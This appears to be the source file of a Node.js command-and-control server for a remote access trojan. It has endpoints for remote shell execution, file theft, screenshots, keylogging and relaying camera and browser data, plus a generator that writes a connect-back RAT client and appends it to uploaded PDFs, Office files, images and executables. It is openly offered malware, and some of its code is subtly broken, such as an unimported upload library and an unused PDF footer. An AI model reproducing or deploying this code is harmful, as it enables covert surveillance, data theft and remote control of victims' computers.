// C2 Server - Command and Control Server for RAT
// This module handles communication with compromised clients

const express = require('express');
const http = require('http');
const socketio = require('socket.io');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const busboy = require('busboy');

class C2Server {
    constructor(config = {}) {
        this.port = config.port || 8443;
        this.host = config.host || '0.0.0.0';
        this.clients = new Map();
        this.apiKey = config.apiKey || this.generateApiKey();
        this.server = null;
        this.io = null;
        this.setupMiddleware();
        this.setupRoutes();
        this.setupSocketIo();
    }

    generateApiKey() {
        return crypto.randomBytes(32).toString('hex');
    }

    setupMiddleware() {
        this.app = express();
        this.app.use(cors());
        this.app.use(express.json({ limit: '50mb' }));
        this.app.use(express.urlencoded({ extended: true }));
        
        // Multer middleware for file uploads
        const storage = multer.diskStorage({
            destination: (req, file, cb) => {
                cb(null, path.join(__dirname, 'uploads'));
            },
            filename: (req, file, cb) => {
                cb(null, file.originalname);
            }
        });
        this.upload = multer({ storage: storage });
        
        // Serve static files without authentication
        this.app.use(express.static(path.join(__dirname)));
        
        // Custom middleware to set Content-Type for static files (runs after static middleware)
        this.app.use((req, res, next) => {
            const urlPath = req.url;
            
            // Set Content-Type based on file extension
            if (urlPath.endsWith('.css')) {
                res.setHeader('Content-Type', 'text/css; charset=utf-8');
            } else if (urlPath.endsWith('.js')) {
                res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
            } else if (urlPath.endsWith('.html')) {
                res.setHeader('Content-Type', 'text/html; charset=utf-8');
            }
            next();
        });
        
        // API Key authentication middleware (only for API endpoints)
        this.app.use((req, res, next) => {
            const apiKey = req.headers['x-api-key'];
            if (req.path.startsWith('/api/')) {
                // Public endpoints (no auth required)
                if (req.path === '/api/health' || req.path === '/api/register' || req.path === '/api/generate-payload' || req.path === '/api/toggle') {
                    return next();
                }
                // Authenticated endpoints (require valid API key)
                if (!apiKey || apiKey !== this.apiKey) {
                    return res.status(401).json({ error: 'Unauthorized' });
                }
            }
            next();
        });
    }

    setupRoutes() {
        // Serve index.html on root path
        this.app.get('/', (req, res) => {
            res.sendFile(path.join(__dirname, 'index.html'));
        });

        // Health check endpoint
        this.app.get('/api/health', (req, res) => {
            res.json({ status: 'online', clients: this.clients.size });
        });

        // Toggle server endpoint
        this.app.post('/api/toggle', (req, res) => {
            const { running } = req.body;
            
            if (running === true) {
                // Start the server
                if (!this.server) {
                    this.server = this.app.listen(this.port, this.host, () => {
                        console.log(`C2 Server started on http://${this.host}:${this.port}`);
                    });
                }
                res.json({ success: true, message: 'Server started', port: this.port });
            } else {
                // Stop the server
                if (this.server) {
                    this.server.close(() => {
                        this.server = null;
                        console.log('C2 Server stopped');
                    });
                }
                res.json({ success: true, message: 'Server stopped' });
            }
        });

        // Register new client
        this.app.post('/api/register', (req, res) => {
            const { clientId, systemInfo } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Client ID required' });
            }
            
            this.clients.set(clientId, {
                ...systemInfo,
                connected: true,
                lastSeen: new Date()
            });
            
            res.json({ success: true, apiKey: this.apiKey });
        });

        // Get all clients
        this.app.get('/api/clients', (req, res) => {
            res.json({ clients: Array.from(this.clients.entries()) });
        });

        // Send command to client
        this.app.post('/api/command', (req, res) => {
            const { clientId, command, args } = req.body;
            if (!clientId || !command) {
                return res.status(400).json({ error: 'Missing clientId or command' });
            }

            if (!this.clients.has(clientId)) {
                return res.status(404).json({ error: 'Client not found' });
            }

            this.io.to(clientId).emit('command', { command, args });
            res.json({ success: true });
        });

        // Execute shell command
        this.app.post('/api/exec', (req, res) => {
            const { clientId, cmd, args = [] } = req.body;
            if (!clientId || !cmd) {
                return res.status(400).json({ error: 'Missing clientId or command' });
            }

            this.io.to(clientId).emit('exec', { cmd, args });
            res.json({ success: true });
        });

        // Get file list
        this.app.post('/api/files', (req, res) => {
            const { clientId, directory } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }

            this.io.to(clientId).emit('listFiles', { directory });
            res.json({ success: true });
        });

        // Download file
        this.app.post('/api/download', (req, res) => {
            const { clientId, filePath } = req.body;
            if (!clientId || !filePath) {
                return res.status(400).json({ error: 'Missing clientId or filePath' });
            }

            this.io.to(clientId).emit('downloadFile', { filePath });
            res.json({ success: true });
        });

        // Take screenshot
        this.app.post('/api/screenshot', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }

            this.io.to(clientId).emit('screenshot');
            res.json({ success: true });
        });

        // Start keylogger
        this.app.post('/api/keylogger/start', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }

            this.io.to(clientId).emit('startKeylogger');
            res.json({ success: true });
        });

        // Stop keylogger
        this.app.post('/api/keylogger/stop', (req, res) => {
            const { clientId } = req.body;
            if (!clientId) {
                return res.status(400).json({ error: 'Missing clientId' });
            }

            this.io.to(clientId).emit('stopKeylogger');
            res.json({ success: true });
        });

        // Client disconnect handler
        this.app.post('/api/disconnect', (req, res) => {
            const { clientId } = req.body;
            if (this.clients.has(clientId)) {
                this.clients.get(clientId).connected = false;
                this.clients.get(clientId).lastSeen = new Date();
            }
            res.json({ success: true });
        });

        // Generate payload with file infection support
        this.app.post('/api/generate-payload', (req, res) => {
            const bb = busboy({ headers: req.headers });
            
            let fileData = null;
            let fileFields = {};
            
            bb.on('file', (name, file, info) => {
                const { filename } = info;
                const chunks = [];
                file.on('data', (data) => {
                    chunks.push(data);
                });
                file.on('end', () => {
                    fileData = {
                        fieldName: name,
                        filename: filename,
                        data: Buffer.concat(chunks)
                    };
                });
            });
            
            bb.on('field', (name, value) => {
                fileFields[name] = value;
            });
            
            bb.on('close', () => {
                const mode = fileFields.mode || 'standalone';
                const serverHost = fileFields.serverHost || 'localhost';
                const serverPort = fileFields.serverPort || 8443;
                
                // Handle savePath - convert relative paths to absolute
                let savePath = fileFields.savePath;
                if (!savePath || savePath.trim() === '') {
                    savePath = path.join(__dirname, 'payloads');
                } else {
                    savePath = path.isAbsolute(savePath) ? savePath : path.join(__dirname, savePath);
                }
                
                // Check if a file was uploaded
                if (fileData && mode === 'infect') {
                    const uploadedFile = fileData;
                    const fileName = uploadedFile.filename;
                    const fileExtension = path.extname(fileName).toLowerCase();
                    
                    try {
                        // Read the original file content
                        const originalContent = uploadedFile.data;
                        const originalContentType = this.getContentType(fileExtension);
                        
                        // Generate the RAT payload code
                        const ratPayload = this.generateRATCode(serverHost, serverPort);
                        
                        // Embed RAT code into the file based on type
                        let infectedContent;
                        let infectedFileName = fileName;
                        
                        switch (fileExtension) {
                            case '.pdf':
                                infectedContent = this.infectPDF(originalContent, ratPayload);
                                infectedFileName = this.getRandomFileName('pdf');
                                break;
                                
                            case '.doc':
                            case '.docx':
                                infectedContent = this.infectOfficeDoc(originalContent, ratPayload, fileExtension);
                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
                                break;
                                
                            case '.xls':
                            case '.xlsx':
                                infectedContent = this.infectOfficeDoc(originalContent, ratPayload, fileExtension);
                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
                                break;
                                
                            case '.jpg':
                            case '.jpeg':
                            case '.png':
                            case '.gif':
                                infectedContent = this.infectImage(originalContent, ratPayload, fileExtension);
                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
                                break;
                                
                            case '.exe':
                            case '.bat':
                            case '.cmd':
                            case '.js':
                            case '.py':
                            case '.txt':
                            default:
                                // For executable/script files, append RAT code at the end
                                infectedContent = Buffer.concat([originalContent, Buffer.from(ratPayload)]);
                                infectedFileName = this.getRandomFileName(fileExtension.substring(1));
                                break;
                        }
                        
                        // Save the infected file to disk
                        if (!fs.existsSync(savePath)) {
                            fs.mkdirSync(savePath, { recursive: true });
                        }
                        const savedPath = path.join(savePath, infectedFileName);
                        fs.writeFileSync(savedPath, infectedContent);
                        console.log(`Saved infected payload to: ${savedPath}`);
                        
                        // Send the infected file
                        res.setHeader('Content-Type', originalContentType || 'application/octet-stream');
                        res.setHeader('Content-Disposition', `attachment; filename="${infectedFileName}"`);
                        res.send(infectedContent);
                        
                    } catch (error) {
                        console.error('Error infecting file:', error);
                        res.status(500).json({ error: 'Failed to infect file: ' + error.message });
                    }
                } else {
                    // Generate standalone payload
                    const payload = this.generateRATCode(serverHost, serverPort);
                    
                    // Save standalone payload to disk
                    if (!fs.existsSync(savePath)) {
                        fs.mkdirSync(savePath, { recursive: true });
                    }
                    const savedPath = path.join(savePath, `payload_${Date.now()}.js`);
                    fs.writeFileSync(savedPath, payload);
                    console.log(`Saved standalone payload to: ${savedPath}`);
                    
                    res.setHeader('Content-Type', 'application/javascript');
                    res.setHeader('Content-Disposition', 'attachment; filename="payload.js"');
                    res.send(payload);
                }
            });
            
            req.pipe(bb);
        });
    }
    
    generateRATCode(serverHost, serverPort) {
        return `// Generated RAT Client Payload
// Connects to C2 Server at ${serverHost}:${serverPort}

const net = require('net');
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const SERVER_HOST = '${serverHost}';
const SERVER_PORT = ${serverPort};

class RATClient {
    constructor() {
        this.socket = null;
        this.connected = false;
        this.clientId = process.pid.toString();
    }

    connect() {
        return new Promise((resolve, reject) => {
            this.socket = net.createConnection({
                host: SERVER_HOST,
                port: SERVER_PORT
            }, () => {
                console.log('Connected to C2 server');
                this.connected = true;
                this.sendClientId();
                resolve();
            });

            this.socket.on('data', (data) => {
                this.handleCommand(data.toString());
            });

            this.socket.on('error', (error) => {
                console.error('Connection error:', error.message);
                this.connected = false;
            });

            this.socket.on('end', () => {
                console.log('Disconnected from C2 server');
                this.connected = false;
            });
        });
    }

    sendClientId() {
        if (this.socket && this.socket.writable) {
            this.socket.write(JSON.stringify({ type: 'register', clientId: this.clientId }));
        }
    }

    handleCommand(data) {
        try {
            const command = JSON.parse(data);
            
            if (command.type === 'exec') {
                this.executeCommand(command.cmd, command.args);
            } else if (command.type === 'ping') {
                this.sendResponse({ type: 'pong', timestamp: Date.now() });
            }
        } catch (error) {
            console.error('Error handling command:', error.message);
        }
    }

    executeCommand(cmd, args = []) {
        exec(cmd, { args }, (error, stdout, stderr) => {
            const result = {
                type: 'exec_result',
                cmd: cmd,
                stdout: stdout,
                stderr: stderr || '',
                exitCode: error ? error.code : 0
            };
            this.sendResponse(result);
        });
    }

    sendResponse(data) {
        if (this.socket && this.socket.writable) {
            this.socket.write(JSON.stringify(data));
        }
    }

    reconnect() {
        if (!this.connected) {
            setTimeout(() => this.connect(), 5000);
        }
    }
}

// Main execution
const client = new RATClient();

async function start() {
    await client.connect();
    
    client.socket.on('end', () => {
        client.reconnect();
    });
}

start();
`;
    }
    
    getContentType(extension) {
        const contentTypes = {
            '.pdf': 'application/pdf',
            '.doc': 'application/msword',
            '.docx': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            '.xls': 'application/vnd.ms-excel',
            '.xlsx': 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            '.jpg': 'image/jpeg',
            '.jpeg': 'image/jpeg',
            '.png': 'image/png',
            '.gif': 'image/gif',
            '.exe': 'application/x-executable',
            '.bat': 'application/x-bat',
            '.cmd': 'application/x-cmd',
            '.js': 'text/javascript',
            '.py': 'text/x-python',
            '.txt': 'text/plain'
        };
        return contentTypes[extension] || 'application/octet-stream';
    }
    
    getRandomFileName(extension) {
        const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
        let randomName = '';
        for (let i = 0; i < 16; i++) {
            randomName += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return `${randomName}.${extension}`;
    }
    
    infectPDF(originalContent, ratPayload) {
        // PDF infection: append RAT code as PDF comment at the end
        const ratBase64 = Buffer.from(ratPayload).toString('base64');
        const pdfFooter = `
%%RAT_EMBEDDED%%
${ratBase64}
%%END_RAT%%
`;
        return Buffer.concat([originalContent, Buffer.from('\n' + ratPayload)]);
    }
    
    infectOfficeDoc(originalContent, ratPayload, fileFormat) {
        // For Office docs, we'll append RAT code at the end
        // In a real scenario, this would properly embed in the document structure
        return Buffer.concat([Buffer.from(originalContent), Buffer.from('\n/* RAT Payload */\n' + ratPayload)]);
    }
    
    infectImage(originalContent, ratPayload, fileFormat) {
        // For images, append RAT code after the file content
        // This creates a polyglot file that can still be viewed as the original type
        return Buffer.concat([Buffer.from(originalContent), Buffer.from('\n/* RAT Payload */\n' + ratPayload)]);
    }

    setupSocketIo() {
        this.server = http.createServer(this.app);
        this.io = socketio(this.server, {
            cors: {
                origin: '*',
                methods: ['GET', 'POST']
            }
        });

        this.io.on('connection', (socket) => {
            console.log(`Client connected: ${socket.id}`);
            
            socket.on('disconnect', () => {
                console.log(`Client disconnected: ${socket.id}`);
                if (this.clients.has(socket.id)) {
                    this.clients.get(socket.id).connected = false;
                }
            });

            socket.on('response', (data) => {
                console.log('Response from client:', socket.id, data);
            });

            socket.on('keylogData', (data) => {
                console.log('Keylog data from', socket.id, data);
                // Forward keylog data to browser client
                socket.broadcast.emit('keylogData', data);
            });

            socket.on('fileData', (data) => {
                console.log('File transfer from', socket.id);
                // Forward file data to browser client
                socket.broadcast.emit('fileData', data);
            });

            socket.on('screenshot_data', (data) => {
                console.log('Screenshot data from', socket.id);
                // Forward screenshot to browser client
                socket.broadcast.emit('screenshot_data', data);
            });

            socket.on('client_response', (data) => {
                console.log('Response from client:', socket.id, data.type);
                // Forward response to browser client
                socket.broadcast.emit('client_response', data);
            });

            socket.on('keylogger_status', (data) => {
                console.log('Keylogger status from', socket.id, data.status);
                // Forward keylogger status to browser client
                socket.broadcast.emit('keylogger_status', data);
            });

            socket.on('file_list', (data) => {
                console.log('File list from', socket.id, data.directory);
                // Forward file list to browser client
                socket.broadcast.emit('file_list', data);
            });

            socket.on('camera_data', (data) => {
                console.log('Camera data from', socket.id);
                // Forward camera data to browser client
                socket.broadcast.emit('camera_data', data);
            });

            socket.on('web_data', (data) => {
                console.log('Web browser data from', socket.id);
                // Forward web browser data to browser client
                socket.broadcast.emit('web_data', data);
            });
        });
    }

    start() {
        return new Promise((resolve, reject) => {
            this.server.listen(this.port, this.host, () => {
                console.log(`C2 Server running on http://${this.host}:${this.port}`);
                console.log(`API Key: ${this.apiKey}`);
                console.log(`Connected clients: ${this.clients.size}`);
                resolve(this.server);
            });
            
            this.server.on('error', (error) => {
                console.error('Server error:', error);
                reject(error);
            });
        });
    }

    stop() {
        return new Promise((resolve) => {
            this.server.close(() => {
                console.log('C2 Server stopped');
                this.clients.clear();
                resolve();
            });
        });
    }

    getClient(clientId) {
        return this.clients.get(clientId);
    }

    getAllClients() {
        return Array.from(this.clients.entries());
    }
}

// Start server if this file is run directly
if (require.main === module) {
    const server = new C2Server();
    server.start().catch(console.error);
}

module.exports = C2Server;
